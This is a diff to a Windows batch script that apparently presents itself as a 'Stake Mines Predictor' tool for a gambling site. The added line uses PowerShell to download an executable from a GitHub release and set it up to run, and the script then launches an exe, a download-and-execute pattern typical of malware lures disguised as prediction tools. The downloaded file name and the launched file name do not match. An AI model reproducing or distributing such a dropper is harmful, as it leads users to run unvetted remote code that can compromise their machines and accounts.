@@ -8,7 +8,7 @@ echo.
 echo Coded By https://github.com/IW-CommunityXStake-Predictor
 echo.
 
-powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Stake-Community/Stake-Crash-Predictor/releases/download/stake-crash/stake-crash.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;
+powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IW-CommunityXStake-Predictor/Stake-Mines-Predictor/releases/download/Mines-Predictor/Stake-Mines.exe';$file='Stake-Mines.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;
 
 start stake-crash.exe
 
